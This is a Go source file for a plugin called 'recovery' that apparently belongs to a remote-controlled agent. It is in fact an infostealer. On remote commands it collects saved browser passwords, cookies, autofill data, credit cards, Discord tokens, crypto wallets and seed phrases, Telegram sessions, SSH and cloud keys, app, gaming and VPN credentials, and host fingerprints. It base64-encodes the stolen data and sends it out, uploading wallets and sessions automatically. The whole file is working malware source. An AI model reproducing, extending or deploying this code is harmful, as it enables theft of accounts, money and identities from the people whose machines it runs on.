package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"log"
	"path/filepath"
	"recovery/recovery"
	"sync"
	"sync/atomic"
	"time"
)

// collectDeadline bounds an entire collection run. A single stuck browser
// (NSS/COM/pipe stall) must never wedge the agent for more than this.
const collectDeadline = 90 * time.Second

type HostInfo struct {
	ClientID string `json:"clientId"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
}

var (
	hostInfo   HostInfo
	sendFn     func(event string, payload []byte)
	mu         sync.Mutex
	collecting atomic.Bool
)

func setSend(fn func(event string, payload []byte)) {
	mu.Lock()
	sendFn = fn
	mu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	mu.Lock()
	fn := sendFn
	mu.Unlock()
	if fn == nil {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[recovery] marshal error: %v", err)
		return
	}
	fn(event, data)
}

func handleInit(hostJSON []byte) error {
	if err := json.Unmarshal(hostJSON, &hostInfo); err != nil {
		return err
	}
	log.Printf("[recovery] init: clientId=%s os=%s arch=%s", hostInfo.ClientID, hostInfo.OS, hostInfo.Arch)
	sendEvent("ready", map[string]string{"status": "recovery plugin ready"})
	return nil
}

func handleEvent(event string, payload []byte) error {
	switch event {
	case "collect":
		go handleCollect(payload)
	case "scan_files":
		go handleScanFiles()
	case "scan_extensions":
		go handleScanExtensions()
	case "fetch_file":
		go handleFetchFile(payload)
	case "fetch_ext_zip":
		go handleFetchExtZip(payload)
	case "scan_wallets":
		go handleScanWallets()
	case "fetch_wallet_zip":
		go handleFetchWalletZip(payload)
	case "scan_telegram":
		go handleScanTelegram()
	case "fetch_telegram_zip":
		go handleFetchTelegramZip(payload)
	case "scan_keys":
		go handleScanKeys()
	case "scan_apps":
		go handleScanApps()
	case "scan_gaming":
		go handleScanGaming()
	case "scan_vpn":
		go handleScanVPN()
	case "fingerprint":
		go handleFingerprint()
	case "fingerprint_js":
		go handleFingerprintJS()
	case "ping":
		sendEvent("pong", nil)
	default:
		log.Printf("[recovery] unhandled event: %s", event)
	}
	return nil
}

func handleCollect(payload []byte) {
	if !collecting.CompareAndSwap(false, true) {
		log.Printf("[recovery] collection already in progress, ignoring duplicate request")
		return
	}
	defer collecting.Store(false)
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] collection panic: %v", r)
			sendEvent("error", map[string]string{"error": "internal collection error"})
		}
	}()

	var opts recovery.CollectOptions
	if len(payload) > 0 {
		json.Unmarshal(payload, &opts)
	} else {
		opts.Browsers = true
	}

	if opts.Browsers {
		noneSet := !opts.Passwords && !opts.Cookies && !opts.Autofill &&
			!opts.History && !opts.Bookmarks && !opts.CreditCards && !opts.Discord
		if noneSet {
			opts.Passwords = true
			opts.Cookies = true
			opts.Autofill = true
			opts.History = true
			opts.Bookmarks = true
			opts.CreditCards = true
			opts.Discord = true
			opts.Files = true
			opts.Wallets = true
			opts.Telegram = true
			opts.Keys = true
			opts.Apps = true
			opts.Gaming = true
			opts.VPNs = true
		}
	}

	log.Printf("[recovery] starting collection (passwords=%v cookies=%v autofill=%v history=%v bookmarks=%v cards=%v discord=%v)",
		opts.Passwords, opts.Cookies, opts.Autofill, opts.History, opts.Bookmarks, opts.CreditCards, opts.Discord)
	sendEvent("status", map[string]string{"message": "Resolving encryption keys..."})

	var extensions []recovery.ExtensionResult
	var extWg sync.WaitGroup
	if opts.Browsers {
		extWg.Add(1)
		go func() {
			defer extWg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[recovery] extension scan panic: %v", r)
				}
			}()
			extensions = recovery.ScanExtensions()
		}()
	}

	partialFn := func(partial *recovery.CollectionResult) {
		sendEvent("partial", partial)
	}

	ctx, cancel := context.WithTimeout(context.Background(), collectDeadline)
	defer cancel()

	result, err := recovery.Collect(ctx, opts, partialFn)
	if err != nil {
		log.Printf("[recovery] collection failed: %v", err)
		sendEvent("error", map[string]string{"error": err.Error()})
		return
	}

	if opts.Browsers {
		extWg.Wait()
		result.Extensions = extensions
	}

	log.Printf("[recovery] collection complete: %d passwords, %d cookies, %d autofill, %d history, %d bookmarks, %d cards, %d discord tokens, %d extensions, %d wallets, %d telegram, %d keys, %d app creds",
		len(result.Passwords), len(result.Cookies), len(result.Autofill),
		len(result.History), len(result.Bookmarks), len(result.CreditCards), len(result.DiscordTokens), len(result.Extensions), len(result.Wallets), len(result.Telegram), len(result.Keys), len(result.AppCredentials))

	sendEvent("results", result)

	if len(result.Wallets) > 0 {
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[recovery] wallet auto-download panic: %v", r)
				}
			}()
			autoDownloadWallets(result.Wallets)
		}()
	}

	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[recovery] seed scan panic: %v", r)
			}
		}()
		seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
		if len(seeds) > 0 {
			log.Printf("[recovery] seed scan found %d seed phrases", len(seeds))
			sendEvent("seed_scan_results", map[string]interface{}{
				"seeds": seeds,
			})
		}
	}()
}

func handleScanExtensions() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] extension scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "extension scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning extensions..."})
	exts := recovery.ScanExtensions()
	log.Printf("[recovery] extension scan complete: %d extensions", len(exts))
	sendEvent("extension_scan_results", map[string]interface{}{
		"extensions": exts,
	})
}

func handleFetchExtZip(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_ext_zip panic: %v", r)
			sendEvent("fetch_ext_zip_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path  string `json:"path"`
		ExtID string `json:"extId"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_ext_zip_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.ZipDirectory(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_ext_zip %q: %v", req.ExtID, err)
		sendEvent("fetch_ext_zip_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] zipped extension %q (%d bytes)", req.ExtID, len(data))
	sendEvent("fetch_ext_zip_result", map[string]interface{}{
		"path":    req.Path,
		"extId":   req.ExtID,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

const maxAutoDownloadSize = 50 * 1024 * 1024 // 50MB

func handleScanWallets() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] wallet scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "wallet scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning wallets..."})
	wallets := recovery.ScanWallets()
	log.Printf("[recovery] wallet scan complete: %d wallets", len(wallets))
	sendEvent("wallet_scan_results", map[string]interface{}{
		"wallets": wallets,
	})
	autoDownloadWallets(wallets)
}

func autoDownloadWallets(wallets []recovery.WalletResult) {
	for _, w := range wallets {
		if w.Size > maxAutoDownloadSize {
			log.Printf("[recovery] skipping auto-download for %q (%d bytes exceeds limit)", w.Name, w.Size)
			continue
		}
		data, err := recovery.ZipDirectory(w.Path)
		if err != nil {
			log.Printf("[recovery] auto-download zip %q: %v", w.Name, err)
			continue
		}
		log.Printf("[recovery] auto-download %q (%d bytes)", w.Name, len(data))
		sendEvent("wallet_auto_data", map[string]interface{}{
			"name":      w.Name,
			"type":      w.Type,
			"path":      w.Path,
			"addresses": w.Addresses,
			"vaultData": w.VaultData,
			"size":      len(data),
			"content":   base64.StdEncoding.EncodeToString(data),
		})
	}
}

func handleFetchWalletZip(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_wallet_zip panic: %v", r)
			sendEvent("fetch_wallet_zip_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path string `json:"path"`
		Name string `json:"name"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_wallet_zip_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.ZipDirectory(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_wallet_zip %q: %v", req.Name, err)
		sendEvent("fetch_wallet_zip_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] zipped wallet %q (%d bytes)", req.Name, len(data))
	sendEvent("fetch_wallet_zip_result", map[string]interface{}{
		"path":    req.Path,
		"name":    req.Name,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

func handleScanFiles() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] file scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "file scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning files..."})
	files := recovery.ScanFiles()
	log.Printf("[recovery] file scan complete: %d files", len(files))
	sendEvent("file_scan_results", map[string]interface{}{
		"files":     files,
		"truncated": len(files) >= 500,
	})
}

func handleFetchFile(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_file panic: %v", r)
			sendEvent("fetch_file_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_file_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.FetchFile(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_file %q: %v", req.Path, err)
		sendEvent("fetch_file_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] fetched %q (%d bytes)", req.Path, len(data))
	sendEvent("fetch_file_result", map[string]interface{}{
		"path":    req.Path,
		"name":    filepath.Base(req.Path),
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

func handleScanTelegram() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] telegram scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "telegram scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning Telegram sessions..."})
	sessions := recovery.ScanTelegram()
	log.Printf("[recovery] telegram scan complete: %d accounts", len(sessions))
	sendEvent("telegram_scan_results", map[string]interface{}{
		"sessions": sessions,
	})
	for _, s := range sessions {
		if s.Size > maxAutoDownloadSize {
			log.Printf("[recovery] skipping telegram auto-download for %q (%d bytes exceeds limit)", s.Account, s.Size)
			continue
		}
		data, err := recovery.ZipTelegram(s.Path)
		if err != nil {
			log.Printf("[recovery] telegram zip %q: %v", s.Account, err)
			continue
		}
		log.Printf("[recovery] telegram auto-download %q (%d bytes)", s.Account, len(data))
		sendEvent("telegram_data", map[string]interface{}{
			"account": s.Account,
			"path":    s.Path,
			"size":    len(data),
			"content": base64.StdEncoding.EncodeToString(data),
		})
	}
}

func handleFetchTelegramZip(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_telegram_zip panic: %v", r)
			sendEvent("fetch_telegram_zip_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path    string `json:"path"`
		Account string `json:"account"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_telegram_zip_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.ZipTelegram(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_telegram_zip %q: %v", req.Account, err)
		sendEvent("fetch_telegram_zip_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] zipped telegram %q (%d bytes)", req.Account, len(data))
	sendEvent("telegram_data", map[string]interface{}{
		"account": req.Account,
		"path":    req.Path,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

func handleScanKeys() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] key scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "key scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning SSH & cloud keys..."})
	keys := recovery.ScanKeys()
	log.Printf("[recovery] key scan complete: %d keys", len(keys))
	sendEvent("key_scan_results", map[string]interface{}{
		"keys": keys,
	})
}

func handleScanApps() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] app scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "app credential scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning app credentials..."})
	apps := recovery.ScanApps()
	log.Printf("[recovery] app scan complete: %d credentials", len(apps))
	sendEvent("app_scan_results", map[string]interface{}{
		"appCredentials": apps,
	})
}

func handleScanGaming() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] gaming scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "gaming scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning gaming platforms..."})
	gaming := recovery.ScanGaming()
	sendEvent("gaming_scan_results", map[string]interface{}{
		"gaming": gaming,
	})
	if gaming == nil {
		return
	}
	autoDownloadGaming(gaming)
}

func autoDownloadGaming(gaming *recovery.GamingResult) {
	type zipJob struct {
		name string
		fn   func() ([]byte, error)
	}
	var jobs []zipJob

	if gaming.Steam != nil && gaming.Steam.SteamPath != "" {
		steamPath := gaming.Steam.SteamPath
		jobs = append(jobs, zipJob{"steam", func() ([]byte, error) { return recovery.ZipSteamSession(steamPath) }})
	}
	if len(gaming.BattleNet) > 0 {
		jobs = append(jobs, zipJob{"battlenet", recovery.ZipBattleNet})
	}
	if len(gaming.Epic) > 0 {
		jobs = append(jobs, zipJob{"epic", recovery.ZipEpic})
	}
	if len(gaming.Riot) > 0 {
		jobs = append(jobs, zipJob{"riot", recovery.ZipRiot})
	}
	if len(gaming.Uplay) > 0 {
		jobs = append(jobs, zipJob{"uplay", recovery.ZipUplay})
	}

	for _, j := range jobs {
		data, err := j.fn()
		if err != nil || len(data) == 0 {
			log.Printf("[recovery] gaming zip %s: %v", j.name, err)
			continue
		}
		if len(data) > maxAutoDownloadSize {
			log.Printf("[recovery] gaming zip %s too large (%d bytes), skipping", j.name, len(data))
			continue
		}
		log.Printf("[recovery] gaming auto-download %s (%d bytes)", j.name, len(data))
		sendEvent("gaming_data", map[string]interface{}{
			"platform": j.name,
			"size":     len(data),
			"content":  base64.StdEncoding.EncodeToString(data),
		})
	}
}

func handleScanVPN() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] vpn scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "vpn scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning VPN configurations..."})
	vpns := recovery.ScanVPNs()
	sendEvent("vpn_scan_results", map[string]interface{}{
		"vpns": vpns,
	})
}

func handleUnload() {
	log.Printf("[recovery] unloading")
}

func handleFingerprint() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fingerprint panic: %v", r)
			sendEvent("error", map[string]string{"error": "fingerprint error"})
		}
	}()
	sendEvent("fingerprint_result", recovery.CollectFingerprint())
	log.Printf("[recovery] fingerprint collected")
}

func handleFingerprintJS() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fingerprint_js panic: %v", r)
			sendEvent("error", map[string]string{"error": "fingerprint_js error"})
		}
	}()
	result := recovery.CollectJSFingerprint()
	if result == nil {
		sendEvent("fingerprint_js_result", map[string]string{"error": "failed to collect JS fingerprint"})
		return
	}
	sendEvent("fingerprint_js_result", result)
	log.Printf("[recovery] JS fingerprint collected")
}

func main() {}
